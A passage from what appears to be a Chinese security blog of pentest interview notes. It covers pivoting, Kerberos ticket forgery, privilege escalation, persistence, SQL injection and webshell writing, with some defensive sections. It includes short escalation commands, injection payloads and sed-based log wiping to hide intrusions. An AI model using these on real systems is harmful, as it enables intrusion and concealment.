></a><br><strong>反弹socks</strong>：当目标机器没有公网IP，但可访问内网资源时。攻击者可以在内网跳板机上运行EarthWorm使其反弹到某台对外连接的内网服务器上，然后攻击者再通过外网连接到对外服务器进而进入到内网中。这里公网服务器既是正向代理也是反向代理。对于攻击者来说它是可知的，因为我们要通过它访问我们无法访问的资源；对于内网服务器（跳板机）来说它也是可知的，因为我们是在内网服务器（跳板机）上执行的反弹命令，使其反向连接到公网服务器上。而内网服务器（跳板机）在这里充当的仅是公网服务器的正向代理，因为它对于公网服务器来说是可知的，而对于其他内网机来说则是不可知的。<br><a href="https://smms.app/image/wH4klfLjbCJ7Qhi" target="_blank"><img src="https://s2.loli.net/2023/08/06/wH4klfLjbCJ7Qhi.png" ></a></p><h5 id="kerberos协议认证是什么？"><a href="#kerberos协议认证是什么？" class="headerlink" title="kerberos协议认证是什么？"></a>kerberos协议认证是什么？</h5><p>Kerberos是一种网络身份认证的协议，协议设计目的是通过使用秘钥加密技术为客户端/服务器应用程序提供强身份验证。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、修改和插入数据。在以上情况下，Kerberos作为一种可信任的第三方认证服务，通过传统的密码技术执行认证服务。<br><strong>Kerberos认证流程：</strong><br>票据中心授予的票据先去AS身份验证服务，返回身份验证，带着身份验证去TGS拿票据，带着拿回来的票据去服务器。</p><h5 id="白银票据与黄金票据的原理？"><a href="#白银票据与黄金票据的原理？" class="headerlink" title="白银票据与黄金票据的原理？"></a>白银票据与黄金票据的原理？</h5><p><strong>金票</strong>：在 Kerberos 认证中,Client 通过身份认证后,AS 会给 Client一个Logon Session Key 和 TGT,而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的NTLM Hash 又是固定的,所以只要得到 krbtgt 的 NTLM Hash，就可以伪造TGT 和Logon Session Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后,就跳过AS 验证,不用验证账户和密码,所以也不担心域管密码修改。<br><strong>银票</strong>：如果说黄金票据是伪造的 TGT,那么白银票据就是伪造的 ST。在 Kerberos 认证的第三步，Client 带着 ST 和Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST,从而获得Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。所以我们只需要知道 Server 用户的Hash 就可以伪造出一个 ST,且不会经过 KDC,但是伪造的门票只对部分服务起作用。<br><strong>金票和银票的区别</strong>：<br>获取的权限不同<br>认证流程不同<br>加密方式不同</p><h5 id="针对kerbores的攻击有哪些？"><a href="#针对kerbores的攻击有哪些？" class="headerlink" title="针对kerbores的攻击有哪些？"></a>针对kerbores的攻击有哪些？</h5><ol><li>用户名爆破</li><li>密码喷洒和密码爆破</li><li>Kerberoasting</li><li>ASRepRoasting</li><li>黄金票据和白银票据</li><li>MS14-068</li><li>非约束委派、约束委派、基于资源的约束委派</li><li>票据传递（ptt/ptk/ptc）</li><li>mimikatz加密降级攻击(万能钥匙)</li><li>使用恶意的kerberos证书做权限维持</li></ol><h5 id="黄金票的条件要求？"><a href="#黄金票的条件要求？" class="headerlink" title="黄金票的条件要求？"></a>黄金票的条件要求？</h5><p>1.域名称 AD PowerShell模块：（Get-ADDomain）.DNSRoot<br>2.域的SID 值 AD PowerShell模块：（Get-ADDomain）.DomainSID.Value（就是域成员SID值去掉最后的）<br>3.目标服务器的 FQDN<br>4.可利用的服务<br>5.域的KRBTGT账户NTLM密码哈希<br>6.需要伪造的用户名<br>一旦攻击者拥有管理员访问域控制器的权限，就可以使用Mimikatz来提取KRBTGT帐户密码哈希值</p><h5 id="票据伪造"><a href="#票据伪造" class="headerlink" title="票据伪造"></a>票据伪造</h5><p>票据分为黄金票据和白银票据。<br>黄金票据是伪造TGT，伪造黄金票据必须拿到域控管理员的权限才可以。<br>伪造黄金票据需要：域名城、域SID值、域的KRBTGT账户、NTLM哈希密码、伪造用户名</p><h5 id="横向连接方式"><a href="#横向连接方式" class="headerlink" title="横向连接方式"></a>横向连接方式</h5><p>$IPC、Psexec、WMI、Schtasks、AT、SC、WINRM</p><h5 id="如何获取内网中机器数量"><a href="#如何获取内网中机器数量" class="headerlink" title="如何获取内网中机器数量"></a>如何获取内网中机器数量</h5><p>可以使用命令net user /domian<br>使用扫描器扫一下</p><h5 id="内网环境不出网怎么办？"><a href="#内网环境不出网怎么办？" class="headerlink" title="内网环境不出网怎么办？"></a>内网环境不出网怎么办？</h5><ol><li>通过webshell实现内网socket代理</li><li>正向链接</li><li>ssh隧道</li><li>协议不同出网的方式不同，如dns对应dnscat2 tcp对应</li><li>测试是否是特定协议或端口出网</li></ol><h5 id="mimikatz使用方法"><a href="#mimikatz使用方法" class="headerlink" title="mimikatz使用方法"></a>mimikatz使用方法</h5><p>mimikatz是一款强大的系统密码破解获取工具。可以破解哈希值，是一个可加载的Meterpreter模块。<br>如果system的权限无法执行执行。需要先进行提权。<br>在meterpreter中输入<code>run post/multi/recon/local_exploit_suggester</code>，进行提权漏洞检测。</p><h5 id="拿下边界机器如何内网渗透？"><a href="#拿下边界机器如何内网渗透？" class="headerlink" title="拿下边界机器如何内网渗透？"></a>拿下边界机器如何内网渗透？</h5><p>拿下机器后，使用代理访问内网<br>windows环境：reGeorg与proxifier<br>Linux环境：reGeorg与proxychains，<br>使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息，这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的，拿到的各种记录会暴露出部分内网通讯的ip.</p><h5 id="linux常见的提权办法"><a href="#linux常见的提权办法" class="headerlink" title="linux常见的提权办法"></a>linux常见的提权办法</h5><ol><li>uid提权 (find / -perm -u=s -type f 2&gt;/dev/null)</li><li><code>sudo git help config !/bin/bash</code> 或者 <code>！&#39;sh&#39;</code>完成提权</li><li>脏牛提权</li><li>内核提权</li><li>环境劫持</li><li>suid提权</li><li>cve-2021-4034</li><li>docker提权</li></ol><h5 id="Windows提权的若干办法？"><a href="#Windows提权的若干办法？" class="headerlink" title="Windows提权的若干办法？"></a>Windows提权的若干办法？</h5><ol><li>系统漏洞提权<br>通过 Webshell 命令行执行systeminfo 命令查看系统是否打了提权补丁，可使用 exp 进行提权<br>通过 Webshell 找网站读写执行目录，把 cs 马或提权 exp 上传到对方服务器（如果cmd无法执行命令可单独上传 cmd.exe 到对方服务器，菜刀终端设置为 setpc:\XXX\cmd.exe）</li><li>sc 命令提权（administrator–&gt;system）<br>例如：<code>sc Create syscmd binPath= “cmd /K start” type= own type=interactsc start systcmd</code>就得到了一个system权限的cmd环境</li><li>不带引号的服务路径<br>当服务路径带空格的时候，路径空格目录前面一断就会当作文件执行，如<code>C:\ProgramFiles\MSBuild</code> 这个目录，攻击者只要在c盘创建名为 <code>Program.exe</code> 的木马，最后只要系统重启就会执行 <code>C:\Program.exe</code> 文件。</li><li>不安全的服务权限提升<br>由于管理配置错误，用户可能对服务拥有过多的权限，例如用木马替换服务调用的默认文件。</li><li>绕过系统 UAC 提升<br>可通过 msf 里面的 getsystem 绕过 UAC,也可以通过 kail 模块的exploit/windows/local/bypassuac_injection、exploit/windows/local/bypassuac_vbs、exploit/windows/local/ask 绕过 UAC</li></ol><h5 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h5><p><strong>Windows机器：</strong></p><ol><li>替换系统文件类(shift 后门,放大镜后门)</li><li>修改注册表类<br>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls 注册表项、AppInit_DLLs 注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL</li><li>文件类<br>自启动文件夹、office Word StartUp 劫持</li><li>计划任务<br>schtasks 、WMI、bitsadmin</li></ol><p><strong>Linux:</strong></p><ol><li>预加载型动态链接库后门</li><li>strace 后门</li><li>SSH 后门</li><li>SUID 后门</li><li>inetd 服务后门</li><li>协议后门</li><li>vim 后门</li><li>PAM 后门</li><li>进程注入</li><li>Rootkit</li><li>端口复用</li></ol><h5 id="拿到shell后如何接管域控？"><a href="#拿到shell后如何接管域控？" class="headerlink" title="拿到shell后如何接管域控？"></a>拿到shell后如何接管域控？</h5><p>如果拿到的就是域内用户，定位一下域控，提取本机<code>hash</code>看域管是否登陆过本机，是否有域用户的进程之类的注入域用户进程窃取下权限，然后使用一些域内漏洞来提权到域管从而接管域控，然后通过<code>dcsync</code>权限维持或者<code>adminsdhound</code>权限维持，也可以修改机器账号的<code>useraccount</code>为 8192 达成权限维持。<br>（注：把机器账户的UserAccountControl属性修改为8192后，活动目录就会认为这个机器账户是域控）</p><h5 id="内网渗透搭建隧道常见的攻击？"><a href="#内网渗透搭建隧道常见的攻击？" class="headerlink" title="内网渗透搭建隧道常见的攻击？"></a>内网渗透搭建隧道常见的攻击？</h5><p><strong>frp、ew、ssh、Neo-reGeorg、netsh、Lcx</strong><br>网络层：Ipv6情况、icmp情况、Gre隧道0<br>传输层：Tcp 隧道、udp 隧道 常规端口转发<br>应用层：ssh隧道、http隧道、https隧道、dns隧道</p><h5 id="内网横向扩展具体方法？"><a href="#内网横向扩展具体方法？" class="headerlink" title="内网横向扩展具体方法？"></a>内网横向扩展具体方法？</h5><p>密码喷洒、IPC$、WMI、mimikatz、PTH、MS14-068、web漏洞、系统漏洞</p><h5 id="KDC服务默认开放哪些端口？"><a href="#KDC服务默认开放哪些端口？" class="headerlink" title="KDC服务默认开放哪些端口？"></a>KDC服务默认开放哪些端口？</h5><p>88 kerberos krb5、464kerberos kpasswd（v5）</p><h5 id="桌面有管理员会话，想要做会话劫持怎么做？"><a href="#桌面有管理员会话，想要做会话劫持怎么做？" class="headerlink" title="桌面有管理员会话，想要做会话劫持怎么做？"></a>桌面有管理员会话，想要做会话劫持怎么做？</h5><p>提权到system权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。<br>终端服务会话可以是连接状态也可以是未连接状态</p><h5 id="域内攻击方法有什么？"><a href="#域内攻击方法有什么？" class="headerlink" title="域内攻击方法有什么？"></a>域内攻击方法有什么？</h5><p>MS14-068、Roasting攻击离线爆破密码、非约束性委派、基于资源的约束委派、ntlmrelay、CVE-2021-42287/CVE-2021-42278</p><h5 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h5><p>procdump+mimikatz 转储然后用mimikatz离线读取，或者Sam获取然后离线读取。<br>windows server 2012之后，或者打了补丁都抓不到了。<br>只能翻阅文件查找运维等等是否记录密码，或者hash传递、或者获取浏览器的账号密码。</p><h5 id="psexec和wmic的区别"><a href="#psexec和wmic的区别" class="headerlink" title="psexec和wmic的区别"></a>psexec和wmic的区别</h5><p>psexec会记录大量日志，wmic不会记录日志并且更为隐蔽</p><h5 id="横向渗透命令执行手段"><a href="#横向渗透命令执行手段" class="headerlink" title="横向渗透命令执行手段"></a>横向渗透命令执行手段</h5><p>psexec，wmic，smbexec，winrm，net use共享+计划任务+type命令</p><h5 id="内网的白名单如何突破？"><a href="#内网的白名单如何突破？" class="headerlink" title="内网的白名单如何突破？"></a>内网的白名单如何突破？</h5><ul><li>利用已在白名单中的软件执行目标代码，甚至发动无文件攻击</li><li>白名单污染</li><li>暴力破解白名单防护软件</li></ul><h5 id="内网135端口具体有哪些利用方式？"><a href="#内网135端口具体有哪些利用方式？" class="headerlink" title="内网135端口具体有哪些利用方式？"></a>内网135端口具体有哪些利用方式？</h5><p>爆破用户、wmic执行命令进行横向</p><h5 id="怎么做域控定位？"><a href="#怎么做域控定位？" class="headerlink" title="怎么做域控定位？"></a>怎么做域控定位？</h5><p><strong>cmd定位</strong>：<br>net group “Domain controllers” /Domain //查询域控<br>net time /domain//方式来定位域控，显示域控时间<br><strong>DNS解析记录定位</strong>：<br><code>nslookup -type=all _ldap._tcp.dc._msdcs.tubai.com</code><br>若当前主机dns为域内dns，则可以通过解析记录定位端口探测定位：扫描内网中同时开放<code>389</code>、<code>636</code>与<code>53</code>的机器，<code>389</code>默认是<code>LDAP</code>协议端口，<code>636</code>端口是<code>LDAPS</code>，<code>53</code>端口默认是DNS端口，主要用于域名解析，通过DNS服务器可以实现域名与ip地址之间转换，他们都是域控机器开放的端口<br><strong>SPN扫描定位</strong>：由于<code>SPN</code>本身就是正常的<code>kerberos</code>请求，所以扫描隐蔽，它不同于<code>TCP</code>与<code>UDP</code>常规端口扫描。大部分windows已经自带<code>setspn.exe</code>，且此操作无需管理权限<br>命令：setspn -T tubai.com -Q /<br>扫描结果中根据：<code>CN=AD-SERVER,OU=Domain Controllers,DC=tubai,DC=com</code>来进行域控的定位</p><h5 id="域管定位"><a href="#域管定位" class="headerlink" title="域管定位"></a>域管定位</h5><p>net group “Domain Admins” /domain //查询域管理员<br>此外还可以通过一些工具定位：PSloggedon.exe、PVefindaduser.exe、powerView.ps1</p><h5 id="mimikatz是从哪个进程抓hash"><a href="#mimikatz是从哪个进程抓hash" class="headerlink" title="mimikatz是从哪个进程抓hash?"></a>mimikatz是从哪个进程抓hash?</h5><p>mimikatz是从哪个进程抓hash?</p><h5 id="win2012-无法破解hash-怎么上桌面"><a href="#win2012-无法破解hash-怎么上桌面" class="headerlink" title="win2012 无法破解hash 怎么上桌面?"></a>win2012 无法破解hash 怎么上桌面?</h5><p>hash pth传递</p><h5 id="入侵Linux服务器后需要清除哪些日志？"><a href="#入侵Linux服务器后需要清除哪些日志？" class="headerlink" title="入侵Linux服务器后需要清除哪些日志？"></a>入侵Linux服务器后需要清除哪些日志？</h5><p>web日志，如 apache 的 access.log,error.log。<br>直接将日志清除过于明显,一般使用sed 进行定向清除<code>sed -i -e ‘/192.169.1.1/d’</code><br>history 命令的清除，也是对~/.bash_history 进行定向清除<br>wtmp日志的清除   /var/log/wtmp<br>登录日志清除   /var/log/secure</p><h5 id="内网渗透要怎么做？"><a href="#内网渗透要怎么做？" class="headerlink" title="内网渗透要怎么做？"></a>内网渗透要怎么做？</h5><p>第一种方法：<br>在具备Webshell的情况下，通过Webshell直接上传CS木马到对方服务器运行，在CS软件上面开启 SocksProxy代理，把 kail 直接通过cs socksProxy代理攻击内网进行横向渗透。<br>第二种方法：<br>通过reGeorg+Proxifie进行内网渗透，把 tunnel.nosocket.php 脚本通过Webshell上传到 Web 站点目录进行访问，在本地自己电脑上面执行<code>reGeorgSocksProxy.py -p 9999 –u http://IP 地址/tunnel.nosocket.php</code>，最后配置 Proxifier 本地代理地址与端口进行横向内网渗透。</p><h5 id="内网横向渗透的一些攻击技巧"><a href="#内网横向渗透的一些攻击技巧" class="headerlink" title="内网横向渗透的一些攻击技巧"></a>内网横向渗透的一些攻击技巧</h5><ul><li>通过 nmap、nessus 扫描整个内网 ip 主机漏洞</li></ul><pre><code>ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝2代、cve-2017-7494（samba）、cve-2014-6271(破壳)、php cgi</code></pre><ul><li>通过 nmap 扫内网 Web 站点端口，手动或自动进行漏洞检测</li></ul><pre><code>注入、命令执行、反序列化、文件上传、弱口令等</code></pre><ul><li>通过 ntscan、Bruter、hydra 工具对内网弱口令探测，同时很可能存在密码复用现象</li><li>适当的对内网主机进行 ARP 抓取密码</li><li>如果内网有 AD 域的情况下，可以通过 MS14-068 漏洞、黄金票据、白银票据进行域控攻击，拿下域控就等于基本拿下整个内网</li></ul><h5 id="windows-cmd如何下载文件？"><a href="#windows-cmd如何下载文件？" class="headerlink" title="windows cmd如何下载文件？"></a>windows cmd如何下载文件？</h5><ol><li>certutil.exe</li><li>powershell</li><li>bitsadmin</li><li>vbs</li><li>ftp</li></ol><h5 id="怎么隐藏攻击痕迹？"><a href="#怎么隐藏攻击痕迹？" class="headerlink" title="怎么隐藏攻击痕迹？"></a>怎么隐藏攻击痕迹？</h5><ol><li>跳板</li><li>代理服务器</li><li>Tor</li><li>日志</li><li>清除历史记录</li><li>粉碎文件</li></ol><h5 id="Hash和NTML-hash区别？"><a href="#Hash和NTML-hash区别？" class="headerlink" title="Hash和NTML hash区别？"></a>Hash和NTML hash区别？</h5><p>NTLM Hash（NT LAN Manager）是支持Net NTLM认证协议及本地认证过程中的一个重要参数。其长度为32位，由数字与字母组成。<br>ntml hash生成方式是将明文口令转换成十六进制的格式 转换成Unicode格式，即在每个字节之后添加0x00对Unicode字符串作MD4加密，生成32位十六进制数字串</p><h5 id="内网中的信息收集技术"><a href="#内网中的信息收集技术" class="headerlink" title="内网中的信息收集技术"></a>内网中的信息收集技术</h5><pre><code>【主机信息收集】1. 网络配置 ipconfig /all2. 操作系统 systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;3. 软件信息 systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;4. 服务信息 wmic /namespace:\root\securitycenter2 pathantivirusproduct GET displayName,productState,pathToSignedProductExe5. 用户列表 net user6. 本地管理员信息 net localgroup administrators7. 端口信息 netstat –ano8. 补丁信息 wmic qfe get Caption,Description,HotFixID,InstalledOn9. 查防火墙 netsh firewall show config【域内信息收集】是否有域：使用ipconfig /all命令可以查看网关IP地址、DNS的IP地址以及判断当前主机是否在域内：通过反 向解析查询命令nslookup来解析域名的IP地址，使用解析出来的IP地址进行对比，判断域控制器和 DNS服务器是否在同一台服务器上登录域信息：net config workstationICMP探测内网：for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.174.%I | findstr &quot;TTL=&quot;ARP探测内网：端口信息收集：查询域信息：net view /domain查询域主机：net view /domain:XXX查询域用户：net group /domain查找域控：Nslookup -type=SRV _ldap._tcp net time /domain net group &quot;Domain Controllers&quot; /domain查域用户信息：net user /domain查询域管理员：net group &quot;Domain Admins&quot; /domain查询域sid信息：whoami /all</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;内网渗透的流程&quot;&gt;&lt;a href=&quot;#内网渗透的流程&quot; class=&quot;headerlink&quot; title=&quot;内网渗透的流程&quot;&gt;&lt;/a&gt;内网渗透的流程&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;从外网拿下一个主机当做跳板&lt;/li&gt;
&lt;li&gt;用&lt;code&gt;net user /domi</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>阅经题总结</title>
    <link href="https://liu1272.github.io/2023/08/01/%E9%98%85%E7%BB%8F%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2023/08/01/%E9%98%85%E7%BB%8F%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2023-08-01T04:59:00.000Z</published>
    <updated>2023-08-02T13:33:11.487Z</updated>
    
    <content type="html"><![CDATA[<h5 id="拿到目标站以后的渗透思路？"><a href="#拿到目标站以后的渗透思路？" class="headerlink" title="拿到目标站以后的渗透思路？"></a>拿到目标站以后的渗透思路？</h5><p>渗透测试流程：</p><ol><li>项目前期准备工作</li><li>信息收集：whois、网站源IP、开放端口、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙WAF</li><li>自动化漏洞扫描：Nessus, AWVS，XRAY</li><li>手动挖掘：逻辑漏洞</li><li>验证漏洞</li><li>修复建议</li><li>（如果有）基线检查/复验漏洞</li><li>输出报告</li></ol><h5 id="如何绕过CDN查真实IP？"><a href="#如何绕过CDN查真实IP？" class="headerlink" title="如何绕过CDN查真实IP？"></a>如何绕过CDN查真实IP？</h5><ol><li>多地ping看是否有cdn（基本上非洲的那些ping就是真的了）</li><li>邮件订阅或者rss订阅（QQ邮箱的ip溯源）</li><li>二级域名可能不会做cdn</li><li>nslookup <a href="http://xxx.com/">http://xxx.com</a> 国外dns</li></ol><h5 id="sleep函数被禁用后怎么进行sql注入？"><a href="#sleep函数被禁用后怎么进行sql注入？" class="headerlink" title="sleep函数被禁用后怎么进行sql注入？"></a>sleep函数被禁用后怎么进行sql注入？</h5><p>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句（例如MD5）使数据库查询时间变长，从而达到延时注入的效果。</p><pre><code>AND (SELECT count(*) FROM information_schema.columns A,information_schema.columns B, information_schema.SCHEMATA C);</code></pre><h5 id="哪些地方存在xxe？架构问题？"><a href="#哪些地方存在xxe？架构问题？" class="headerlink" title="哪些地方存在xxe？架构问题？"></a>哪些地方存在xxe？架构问题？</h5><p><strong>xxe常见场景</strong><br>pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。<br><strong>xxe危害</strong><br>读取本地文件，执行系统命令，探测内网端口，攻击内网服务<br>探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定，file http ftp是常用的<br><strong>防范</strong><br>python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml<br>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析<br>Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：<br>javax.xml.stream.XMLStreamReader;<br>javax.xml.parsers.DocumentBuilderFactory;</p><h5 id="如何绕过Http-only？"><a href="#如何绕过Http-only？" class="headerlink" title="如何绕过Http-only？"></a>如何绕过Http-only？</h5><p>HTTP-Only禁止的是JS读取cookie信息，Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄露</p><h5 id="SQL二次注入？"><a href="#SQL二次注入？" class="headerlink" title="SQL二次注入？"></a>SQL二次注入？</h5><p>第一次进行数据库插入数据的时候，仅仅只是使用了<code>addslashes</code>或者是借助<code>get_magic_quotes_gpc</code>对其中的特殊字符进行了转义，在写入数据库的时候还是保留了<br>原来的数据，但是数据本身还是脏数据。<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>一些交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用and 1=1确定注入点，用order by探测列数，union select探测输出点是第几列，</p><ol><li>爆库 <code>group_concat(schema_name) from information_schema.schemata</code></li><li>爆表 <code>group_concat(table_name) from information_schema.schemata where table_schema=&#39;hhh&#39;</code></li><li>获取数据 <code>concat(flag) from flag</code><br>修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。</li></ol><h5 id="SQLserver提权"><a href="#SQLserver提权" class="headerlink" title="SQLserver提权?"></a>SQLserver提权?</h5><p><strong>xp_cmdshell提权</strong><br>xp_cmdshell是Sql Server中的一个组件，可以用来执行系统命令,在拿到sa口令之后，经常可以通过xp_cmdshell来进行提权<br>前提：<br>getshell或者存在sql注入并且能够执行命令。<br>sql server是system权限，sql server默认就是system权限<br><strong>sp_oacreate提权</strong><br>在xp_cmdshell被删除或者出错情况下，可以充分利用SP_OACreate进行提权<br>前提：<br>需要同时具备sp_oacreate和sp_oamethod两个功能组件</p><h5 id="GPC是什么？GPC之后怎么绕过？"><a href="#GPC是什么？GPC之后怎么绕过？" class="headerlink" title="GPC是什么？GPC之后怎么绕过？"></a>GPC是什么？GPC之后怎么绕过？</h5><p>如果<code>magic_quotes_gpc=On</code>，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染</p><h5 id="如何防范webshell"><a href="#如何防范webshell" class="headerlink" title="如何防范webshell?"></a>如何防范webshell?</h5><p>防范的措施大概有三种:</p><ul><li>将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。</li><li>匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。</li><li>将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。</li><li>干脆只能局域网访问，做个隔离谁都看不到</li></ul><h5 id="webshell检查思路？"><a href="#webshell检查思路？" class="headerlink" title="webshell检查思路？"></a>webshell检查思路？</h5><p>首先，通过浏览器以HTTP协议访问Web Server上的一个CGI文件，是一个合法的TCP连接，TCP/IP的应用层之下没有任何特征，只能在<strong>应用层进行检测</strong>。<br>黑客不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是<strong>静态特征检测</strong>。<br>webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是<strong>动态特征检测</strong>。</p><p>【静态检测】<br>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法。<br>优点是快速方便，对已知的webshell查找准确率高，部署方便。<br>缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。</p><p>【静态检测配合人工】<br>一个检查工具 <a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p>【动态检测】<br>Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。<br>如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。<br>Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。<br>缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p><p>【日志检测】<br>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页<br>面的访问数据和数据提交记录。<br>日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测</p><p>【寻找webshell】<br>1.自动化查找：D盾 河马 fotify<br>2.手动查找：windows sublime 全文件夹查找 IDE PHPSTORM 全局查找<br>Linux 命令查找 <code>grep -rn &quot;eval(&quot; *</code><br>webshell特征 PHP的危险函数<br>还有<code>phar &lt;?php XXXXX</code></p><h5 id="见过哪些登录页面的漏洞？"><a href="#见过哪些登录页面的漏洞？" class="headerlink" title="见过哪些登录页面的漏洞？"></a>见过哪些登录页面的漏洞？</h5><p>注入点以及万能密码（分jsp，php等页面的万能密码）<br>敏感信息泄露（未授权，文件路径）<br>越权漏洞（多是框架编写问题）<br>验证码绕过<br>无限注册帐号<br>任意密码重置<br>明文传输</p><h5 id="如何快速判定XSS类型？"><a href="#如何快速判定XSS类型？" class="headerlink" title="如何快速判定XSS类型？"></a>如何快速判定XSS类型？</h5><p>存储型XSS：<br>你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；<br>反射型XSS：<br>你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；<br>DOM型XSS：<br>你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；<br>CSP策略：浏览器内容安全策略，减少xss攻击。</p><h5 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h5><ul><li>CSRF是跨站请求伪造攻击，由客户端发起</li><li>SSRF是服务器端请求伪造，由服务器发起</li><li>重放攻击是将截获的数据包进行重放，达到身份认证等目的</li></ul><h5 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h5><ol><li>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。</li></ol><p><strong>修复方式</strong>：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。<br>2. CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。<br><strong>修复方式</strong>：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.<br>3. XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。<br><strong>修复方式</strong>：XML解析库在调用时严格禁止对外部实体的解析。</p><h5 id="mysql的网站，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站，5-0以上和5-0以下有什么区别？" class="headerlink" title="mysql的网站，5.0以上和5.0以下有什么区别？"></a>mysql的网站，5.0以上和5.0以下有什么区别？</h5><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。<br>5.0以下是多用户单操作，5.0以上是多用户多操作</p><h5 id="关于MySQL写shell的问题"><a href="#关于MySQL写shell的问题" class="headerlink" title="关于MySQL写shell的问题"></a>关于MySQL写shell的问题</h5><p><del>妈了个逼的怎么这么喜欢问这方面的东西</del><br>1.写shell用什么函数？</p><ul><li><code>select &#39;&lt;?php phpinfo()&gt; into outfile &#39;D:/shelltest.php&#39;</code></li><li><code>dumpfile</code></li><li><code>file_put_contents</code></li></ul><p>2.outfile不能用了怎么办？<br><code>select unhex(&#39;udf.dll hex code&#39;) intodumpfile &#39;c:/mysql/mysql server 